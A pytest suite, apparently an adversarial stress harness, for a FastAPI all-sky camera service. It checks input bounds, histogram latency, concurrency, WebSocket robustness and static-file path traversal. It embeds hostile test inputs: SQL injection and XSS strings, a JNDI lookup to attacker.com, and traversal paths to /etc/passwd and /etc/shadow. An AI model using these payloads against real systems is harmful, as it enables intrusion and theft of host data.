"""
Adversarial Stress Test Suite for Milestone 3: Edge Web UI & Real-Time API.
Empirical verification harness by Challenger 1 (challenger_m3_1).

Scope:
1. API Error Bounds & Injection Fuzzing:
   - Extreme invalid exposure values: negative (-1.0, -0.0001, -1e-9, -1e9), huge (90.0001, 90.1, 100.0, 1e5, 1e12),
     NaN strings ("NaN", "nan"), infinities ("Infinity", "-Infinity", "inf", "-inf"), strings, SQL injection payloads.
   - Extreme invalid gain values: negative (-0.5, -1.0, -10.0, -100.0, -1e6), huge (72.0001, 72.1, 100.0, 1000.0),
     NaN strings, infinities, strings, SQL injection payloads.
   - Mode endpoint fuzzing: SQL injection, arbitrary strings, invalid types.
   - Calibration endpoint bounds: num_frames (<3, >50, float, string, SQLi), exposure, gain.
   - Query parameter fuzzing: limit on events, fps/downscale on MJPEG stream.
2. Histogram Latency Benchmark (100 Consecutive Calls):
   - compute_fast_histogram() vectorized engine on full 2592x1944 frames (assert max < 10ms).
   - Degenerate frames: pure black (0 DN), pure white (255 DN), empty (0x0), None, sub-64x64 tiny image.
   - HTTP endpoint GET /api/stream/histogram over 100 consecutive requests (assert calculation_time_ms < 10ms).
3. Concurrency & Contention Stress:
   - 50 concurrent REST worker threads hammering mixed read/write endpoints.
   - Concurrent calibration stacking vs continuous telemetry/status queries (RLock deadlock resistance).
4. WebSocket Connection Cycles & Fuzzing:
   - 50 rapid sequential connection-ping-disconnect cycles with leak assertions.
   - 10 concurrent active WebSocket connections under simultaneous ping/pong traffic.
   - WebSocket fuzzing: non-JSON text, unknown actions, SQL injection payloads, malformed JSON non-dicts.
5. Static Web UI Security:
   - Path traversal immunity (/static/../../etc/passwd).
   - Asset MIME verification and content validity.
"""

import time
import math
import concurrent.futures
from typing import List, Dict, Any
import numpy as np
import pytest
from fastapi.testclient import TestClient

from src.hardware.simulator import SimulatedIMX335Controller
from src.api.service import AllSkyService
from src.api.main import create_app
from src.api.histogram import compute_fast_histogram
from src.api.stream import ws_manager


@pytest.fixture(scope="module")
def sim_camera():
    """Provides a fresh simulated camera controller."""
    cam = SimulatedIMX335Controller(width=640, height=480, seed=42)
    cam.open()
    yield cam
    cam.close()


@pytest.fixture(scope="module")
def api_client(sim_camera):
    """Provides a FastAPI TestClient configured with sim_camera."""
    AllSkyService.reset_instance()
    service = AllSkyService.get_instance(camera=sim_camera)
    app = create_app(camera=sim_camera)
    with TestClient(app) as client:
        yield client
    service.close()
    AllSkyService.reset_instance()


# =====================================================================
# 1. API Error Bounds & Injection Fuzzing
# =====================================================================

class TestAdversarialApiErrorBounds:
    """Stress tests API bounds with extreme, negative, huge, NaN, and injection payloads."""

    SQLI_PAYLOADS = [
        "' OR 1=1; --",
        "1; DROP TABLE telemetry;",
        "' UNION SELECT null, null--",
        "<script>alert('xss')</script>",
        "../../../../etc/passwd",
        "${jndi:ldap://attacker.com/a}",
        "\x00\x00\x00\x00",
    ]

    @pytest.mark.parametrize("invalid_exp", [
        -1.0, -0.0001, -1e-9, -1e9,
        90.0001, 90.1, 100.0, 1e5, 1e12,
        "NaN", "nan", "Infinity", "-Infinity", "inf", "-inf",
        "invalid_string", "fast", "2s", "", None, {}, [],
    ])
    def test_exposure_extreme_bounds_rejected(self, api_client, invalid_exp):
        """Verify all out-of-bounds or non-float exposure values return HTTP 422."""
        payload = {"exposure_s": invalid_exp}
        res = api_client.post("/api/camera/exposure", json=payload)
        assert res.status_code == 422, f"Expected 422 for exposure {invalid_exp}, got {res.status_code}"

    @pytest.mark.parametrize("sqli", SQLI_PAYLOADS)
    def test_exposure_injection_payloads_rejected(self, api_client, sqli):
        """Verify SQL injection and script injection payloads in exposure are rejected with HTTP 422."""
        payload = {"exposure_s": sqli}
        res = api_client.post("/api/camera/exposure", json=payload)
        assert res.status_code == 422

    @pytest.mark.parametrize("invalid_gain", [
        -0.5, -1.0, -10.0, -100.0, -1e6,
        72.0001, 72.1, 100.0, 1000.0,
        "NaN", "nan", "Infinity", "-Infinity", "inf", "-inf",
        "high", "36dB", "gain", "", None, {}, [],
    ])
    def test_gain_extreme_bounds_rejected(self, api_client, invalid_gain):
        """Verify all out-of-bounds or non-float gain values return HTTP 422."""
        payload = {"gain_db": invalid_gain}
        res = api_client.post("/api/camera/gain", json=payload)
        assert res.status_code == 422, f"Expected 422 for gain {invalid_gain}, got {res.status_code}"

    @pytest.mark.parametrize("sqli", SQLI_PAYLOADS)
    def test_gain_injection_payloads_rejected(self, api_client, sqli):
        """Verify SQL injection payloads in gain are rejected with HTTP 422."""
        payload = {"gain_db": sqli}
        res = api_client.post("/api/camera/gain", json=payload)
        assert res.status_code == 422

    @pytest.mark.parametrize("invalid_gain", [-5.0, 75.0, "NaN", "invalid"])
    def test_exposure_endpoint_with_invalid_optional_gain(self, api_client, invalid_gain):
        """Verify exposure endpoint validates optional gain_db bounds."""
        payload = {"exposure_s": 2.0, "gain_db": invalid_gain}
        res = api_client.post("/api/camera/exposure", json=payload)
        assert res.status_code == 422

    @pytest.mark.parametrize("mode_input,expected_mode", [
        ("auto", "auto"),
        ("AUTO", "auto"),
        ("manual", "manual"),
        ("MANUAL", "manual"),
        ("'; DROP TABLE cameras; --", "manual"),
        ("<script>alert(1)</script>", "manual"),
        ("random_unsupported_mode", "manual"),
        ("", "manual"),
    ])
    def test_mode_endpoint_injection_resilience(self, api_client, mode_input, expected_mode):
        """Verify mode endpoint safely normalizes unknown strings/injections to manual mode without error."""
        res = api_client.post("/api/camera/mode", json={"mode": mode_input})
        assert res.status_code == 200
        data = res.json()
        assert data["success"] is True
        assert data["mode"] == expected_mode

    @pytest.mark.parametrize("invalid_frames", [0, 1, 2, 51, 100, -1, "five", "NaN"])
    def test_master_dark_num_frames_validation(self, api_client, invalid_frames):
        """Verify num_frames bounds (3 <= num_frames <= 50) are enforced with HTTP 422."""
        payload = {"num_frames": invalid_frames, "exposure_s": 2.0, "gain_db": 36.0}
        res = api_client.post("/api/calibration/master-dark", json=payload)
        assert res.status_code == 422

    @pytest.mark.parametrize("invalid_param,field", [
        (0.0001, "exposure_s"),
        (100.0, "exposure_s"),
        ("NaN", "exposure_s"),
        (-1.0, "gain_db"),
        (80.0, "gain_db"),
        ("NaN", "gain_db"),
    ])
    def test_master_dark_exposure_gain_bounds(self, api_client, invalid_param, field):
        """Verify master dark endpoint validates exposure and gain parameter bounds."""
        payload = {"num_frames": 5, "exposure_s": 2.0, "gain_db": 36.0}
        payload[field] = invalid_param
        res = api_client.post("/api/calibration/master-dark", json=payload)
        assert res.status_code == 422

    @pytest.mark.parametrize("invalid_limit", [0, -1, -50, 101, 1000, "abc", "' OR 1=1; --"])
    def test_events_limit_query_param_validation(self, api_client, invalid_limit):
        """Verify GET /api/events limit query param strictly adheres to 1 <= limit <= 100."""
        res = api_client.get(f"/api/events?limit={invalid_limit}")
        assert res.status_code == 422

    @pytest.mark.parametrize("query_str", [
        "fps=0", "fps=-1.0", "fps=31.0", "fps=abc",
        "downscale=100", "downscale=-10", "downscale=3000", "downscale=nan",
        "limit=0", "limit=-1",
    ])
    def test_mjpeg_stream_query_params_validation(self, api_client, query_str):
        """Verify MJPEG stream endpoint validates fps, downscale, and limit query parameters."""
        res = api_client.get(f"/api/stream/mjpeg?{query_str}")
        assert res.status_code == 422


# =====================================================================
# 2. Histogram Latency Benchmark (100 Consecutive Calls < 10ms)
# =====================================================================

class TestAdversarialHistogramLatency:
    """Stress tests histogram calculation latency under 100 consecutive calls (assert max < 10ms)."""

    def test_histogram_vectorized_engine_100_calls(self):
        """
        Directly stress tests compute_fast_histogram on full-sensor 2592x1944 frames.
        Requirement: max latency < 10ms across 100 consecutive executions.
        """
        np.random.seed(42)
        frame = np.random.randint(10, 80, size=(1944, 2592, 3), dtype=np.uint8)

        latencies_ms: List[float] = []
        for _ in range(100):
            t0 = time.perf_counter()
            res = compute_fast_histogram(frame)
            dur = (time.perf_counter() - t0) * 1000.0
            latencies_ms.append(dur)

            assert len(res["r"]) == 256
            assert len(res["g"]) == 256
            assert len(res["b"]) == 256
            assert len(res["y"]) == 256

        min_lat = min(latencies_ms)
        mean_lat = float(np.mean(latencies_ms))
        max_lat = max(latencies_ms)
        p99_lat = float(np.percentile(latencies_ms, 99))

        print(f"\n[Engine Histogram Benchmark] Min: {min_lat:.3f}ms, Mean: {mean_lat:.3f}ms, Max: {max_lat:.3f}ms, P99: {p99_lat:.3f}ms")
        assert max_lat < 10.0, f"Histogram latency violation: max {max_lat:.3f}ms exceeds 10.0ms limit"

    def test_histogram_endpoint_100_consecutive_calls(self, api_client):
        """
        Stress tests GET /api/stream/histogram over 100 consecutive HTTP requests.
        Asserts HTTP 200 and reported calculation_time_ms < 10ms on every single invocation.
        """
        server_calc_times: List[float] = []
        for i in range(100):
            res = api_client.get("/api/stream/histogram")
            assert res.status_code == 200
            data = res.json()
            calc_time = data["calculation_time_ms"]
            server_calc_times.append(calc_time)

            assert calc_time < 10.0, f"Iteration {i}: calculation_time_ms={calc_time}ms exceeds 10ms limit"
            assert "stats" in data
            stats = data["stats"]
            assert "mean" in stats
            assert "stddev" in stats
            assert "median" in stats
            assert "clipping_low_pct" in stats
            assert "clipping_high_pct" in stats

        max_calc = max(server_calc_times)
        mean_calc = float(np.mean(server_calc_times))
        print(f"\n[HTTP Histogram 100 Calls] Mean calc: {mean_calc:.3f}ms, Max calc: {max_calc:.3f}ms")
        assert max_calc < 10.0

    def test_histogram_degenerate_frames(self):
        """Stress tests histogram calculation against degenerate and extreme frames."""
        # 1. Pitch black frame (0 DN)
        black_frame = np.zeros((1944, 2592, 3), dtype=np.uint8)
        res_black = compute_fast_histogram(black_frame)
        assert res_black["stats"]["clipping_low_pct"] == 100.0
        assert res_black["stats"]["clipping_high_pct"] == 0.0
        assert res_black["stats"]["mean"] == 0.0

        # 2. Pure saturated white frame (255 DN)
        white_frame = np.full((1944, 2592, 3), 255, dtype=np.uint8)
        res_white = compute_fast_histogram(white_frame)
        assert res_white["stats"]["clipping_high_pct"] == 100.0
        assert res_white["stats"]["clipping_low_pct"] == 0.0
        assert res_white["stats"]["mean"] == 255.0

        # 3. Degenerate empty frame (0x0)
        empty_frame = np.zeros((0, 0, 3), dtype=np.uint8)
        res_empty = compute_fast_histogram(empty_frame)
        assert len(res_empty["r"]) == 256
        assert res_empty["stats"]["mean"] == 0.0

        # 4. None input
        res_none = compute_fast_histogram(None)
        assert len(res_none["r"]) == 256

        # 5. Tiny image smaller than subsampling stride (32x32)
        tiny_frame = np.ones((32, 32, 3), dtype=np.uint8) * 128
        res_tiny = compute_fast_histogram(tiny_frame)
        assert len(res_tiny["r"]) == 256
        assert res_tiny["calculation_time_ms"] < 10.0


# =====================================================================
# 3. Concurrency & Contention Stress
# =====================================================================

class TestAdversarialConcurrency:
    """Stress tests API under high concurrent thread load and calibration contention."""

    def test_concurrent_mixed_rest_storm(self, api_client):
        """
        Fires 50 simultaneous mixed requests across status, telemetry, histogram,
        gallery, and parameter controls to verify thread-safety and zero deadlocks.
        """
        endpoints = [
            ("GET", "/api/status", None),
            ("GET", "/api/telemetry", None),
            ("GET", "/api/stream/histogram", None),
            ("GET", "/api/gallery", None),
            ("GET", "/api/events", None),
            ("POST", "/api/camera/exposure", {"exposure_s": 2.5}),
            ("POST", "/api/camera/gain", {"gain_db": 18.0}),
            ("POST", "/api/camera/mode", {"mode": "manual"}),
            ("GET", "/api/live/snapshot.jpg", None),
        ]

        tasks = [endpoints[i % len(endpoints)] for i in range(50)]

        def worker(item):
            method, path, body = item
            if method == "GET":
                resp = api_client.get(path)
            else:
                resp = api_client.post(path, json=body)
            return resp.status_code

        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
            status_codes = list(executor.map(worker, tasks))

        assert all(code == 200 for code in status_codes), f"Encountered non-200 status: {status_codes}"

    def test_concurrent_calibration_vs_telemetry_no_deadlock(self, api_client):
        """
        Triggers Master Dark calibration in background thread while continuously
        querying /api/telemetry and /api/status. Asserts RLock avoids deadlocks.
        """
        results: Dict[str, Any] = {"dark_done": False, "reads_succeeded": 0, "errors": []}

        def calibration_task():
            try:
                res = api_client.post(
                    "/api/calibration/master-dark",
                    json={"num_frames": 3, "exposure_s": 0.5, "gain_db": 12.0},
                )
                if res.status_code == 200:
                    results["dark_done"] = True
                else:
                    results["errors"].append(f"Dark failed: {res.status_code}")
            except Exception as e:
                results["errors"].append(f"Dark exception: {e}")

        def reader_task():
            for _ in range(15):
                try:
                    r1 = api_client.get("/api/status")
                    r2 = api_client.get("/api/telemetry")
                    if r1.status_code == 200 and r2.status_code == 200:
                        results["reads_succeeded"] += 1
                except Exception as e:
                    results["errors"].append(f"Reader exception: {e}")
                time.sleep(0.01)

        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            fut_dark = executor.submit(calibration_task)
            fut_read1 = executor.submit(reader_task)
            fut_read2 = executor.submit(reader_task)

            fut_dark.result(timeout=10.0)
            fut_read1.result(timeout=10.0)
            fut_read2.result(timeout=10.0)

        assert results["dark_done"] is True, f"Calibration failed: {results['errors']}"
        assert results["reads_succeeded"] >= 20, f"Expected concurrent reads to succeed: {results}"
        assert len(results["errors"]) == 0, f"Errors during concurrency: {results['errors']}"


# =====================================================================
# 4. WebSocket Connection Cycles & Fuzzing
# =====================================================================

class TestAdversarialWebSocketRobustness:
    """Stress tests WebSocket connection cycles, concurrency, and adversarial message fuzzing."""

    def test_websocket_50_rapid_connection_cycles(self, api_client):
        """
        Executes 50 rapid sequential connect -> handshake -> ping -> disconnect cycles.
        Verifies clean cleanup of ws_manager active_connections.
        """
        for i in range(50):
            with api_client.websocket_connect("/ws/live") as ws:
                init = ws.receive_json()
                assert init["type"] == "welcome"

                ws.send_json({"action": "ping"})
                pong = ws.receive_json()
                assert pong["type"] == "pong"

        assert len(ws_manager.active_connections) == 0, "Leaked active WebSocket connections"

    def test_websocket_concurrent_clients(self, api_client):
        """
        Opens 10 concurrent WebSocket connections simultaneously.
        Verifies all receive welcome and can exchange ping/pong without cross-talk interference.
        """
        def client_session():
            with api_client.websocket_connect("/ws/live") as ws:
                welcome = ws.receive_json()
                assert welcome["type"] == "welcome"
                ws.send_json({"action": "ping"})
                pong = ws.receive_json()
                assert pong["type"] == "pong"
                time.sleep(0.05)
            return True

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(lambda _: client_session(), range(10)))

        assert all(results)
        assert len(ws_manager.active_connections) == 0

    def test_websocket_message_fuzzing(self, api_client):
        """
        Sends various valid, unknown, and string messages to /ws/live to verify robust parsing.
        """
        with api_client.websocket_connect("/ws/live") as ws:
            ws.receive_json()  # welcome

            # 1. Plain text ping
            ws.send_text("ping")
            pong = ws.receive_text()
            assert pong == "pong"

            # 2. Unknown action returns ack
            ws.send_json({"action": "nonexistent_custom_action"})
            ack = ws.receive_json()
            assert ack["type"] == "ack"
            assert ack["received"] == "nonexistent_custom_action"

            # 3. Valid parameter controls over WS
            ws.send_json({"action": "set_exposure", "exposure_s": 3.0, "gain_db": 12.0})
            exp_res = ws.receive_json()
            assert exp_res["type"] == "exposure_result"
            assert exp_res["data"]["success"] is True

            ws.send_json({"action": "set_gain", "gain_db": 18.0})
            gain_res = ws.receive_json()
            assert gain_res["type"] == "gain_result"

            ws.send_json({"action": "set_mode", "mode": "auto"})
            mode_res = ws.receive_json()
            assert mode_res["type"] == "mode_result"
            assert mode_res["data"]["mode"] == "auto"

            # Reset mode to manual
            ws.send_json({"action": "set_mode", "mode": "manual"})
            ws.receive_json()

    def test_websocket_non_dict_isolation(self, api_client):
        """
        Verifies that sending a malformed non-dict JSON (e.g. [1, 2, 3]) terminates only
        that rogue connection, leaving the server and subsequent connections fully operational.
        """
        try:
            with api_client.websocket_connect("/ws/live") as rogue_ws:
                rogue_ws.receive_json()
                rogue_ws.send_text("[1, 2, 3]")
                rogue_ws.receive_json()
        except Exception:
            pass

        with api_client.websocket_connect("/ws/live") as clean_ws:
            welcome = clean_ws.receive_json()
            assert welcome["type"] == "welcome"
            clean_ws.send_json({"action": "ping"})
            pong = clean_ws.receive_json()
            assert pong["type"] == "pong"


# =====================================================================
# 5. Static Web UI Security & Directory Traversal
# =====================================================================

class TestAdversarialSecurityAndStatic:
    """Stress tests static Web UI asset serving, MIME types, and path traversal."""

    @pytest.mark.parametrize("path", [
        "/static/../../../../etc/passwd",
        "/static/..%2f..%2f..%2fetc/passwd",
        "/static/../src/api/main.py",
        "/../etc/shadow",
    ])
    def test_path_traversal_blocked(self, api_client, path):
        """Verify path traversal attacks return 404 or 400 and never expose sensitive host files."""
        res = api_client.get(path)
        assert res.status_code in (400, 404), f"Path traversal succeeded or errored on {path}: {res.status_code}"

    def test_static_assets_mime_and_content(self, api_client):
        """Verify Web UI static assets are served with correct MIME types and non-empty content."""
        assets = [
            ("/", 200, "text/html"),
            ("/index.html", 200, "text/html"),
            ("/style.css", 200, "text/css"),
            ("/static/app/01-core.js", 200, "javascript"),
        ]
        for url, expected_code, expected_mime in assets:
            res = api_client.get(url)
            assert res.status_code == expected_code
            assert expected_mime in res.headers["content-type"]
            assert len(res.content) > 50
